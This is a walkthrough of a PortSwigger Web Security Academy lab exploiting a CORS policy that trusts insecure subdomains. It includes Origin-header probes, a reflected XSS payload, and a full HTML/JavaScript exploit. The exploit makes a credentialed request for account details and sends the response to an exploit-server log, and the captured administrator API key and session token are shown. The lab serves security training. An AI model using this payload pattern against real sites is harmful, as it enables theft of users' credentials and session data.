# Lab: CORS vulnerability with trusted insecure protocols
# https://portswigger.net/web-security/learning-paths/cors/cors-vulnerabilities-arising-from-cors-configuration-issues/cors/lab-breaking-https-attack

```bash
# Testing for CORS Misconfigurations:

# 1. Change the origin header to an arbitrary value

# 2. Change the origin header to the null value

# 3. Change the origin header to one that begins with the origin of the site.|
```

```bash

# Load my account page and check account-details request from burp.

# We see Access-Control-Allow-Credentials: true in response send request to repeater.

# Add this request header and send it.
Origin: http://randomweb.com

# Response doesn't have Access-Control-Allow-Origin:

```
```bash
Origin: null

# Response doesn't have Access-Control-Allow-Origin:

```

```bash
# Copy host and turn it to this:

https://0ab100be04d8051f8738564200d900cd.web-security-academy.net.hackers.com

# Response doesn't have Access-Control-Allow-Origin
```
```bash

Origin: https://hacked.0ab100be04d8051f8738564200d900cd.web-security-academy.net

# Response: Access-Control-Allow-Origin: https://hacked.0ab100be04d8051f8738564200d900cd.web-security-academy.net
```

```bash
# Send check store request to repeater

GET /?productId=2&storeId=1 HTTP/1.1
Host: stock.0ab100be04d8051f8738564200d900cd.web-security-academy.net


# Turn it to this:

GET /?productId=<script>alert(0)</script>&storeId=1 HTTP/1.1

# Response:

<h4>ERROR</h4>Invalid product ID: <script>alert(0)</script>

# This means there is XSS here. If you want to see pop up right click on response and click on show response in browser to take url.
```

```bash
<html>
	<body>
		<script>
    document.location="http://stock.0ab100be04d8051f8738564200d900cd.web-security-academy.net/?productId=4<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0ab100be04d8051f8738564200d900cd.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0a3700da04c905ce878c5590019f0014.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
		</script>
	</body>
</html>

# Copy paste this and take the request from logs.
# You can copy paste this code but if you want to write it yourself, you need to url encode + and < at some parts of code.

# Response:
"GET /log?key={%20%20%22username%22:%20%22administrator%22,%20%20%22email%22:%20%22%22,%20%20%22apikey%22:%20%22eNyeQtJ9sQKmXv2gV8Qvu0AM7OulOdVw%22,%20%20%22sessions%22:%20[%20%20%20%20%22uYHrqLaGg6iIvMovCpADGbG6bROn4TkW%22%20%20]} HTTP/1.1"

# Take the api key and submit it.
```


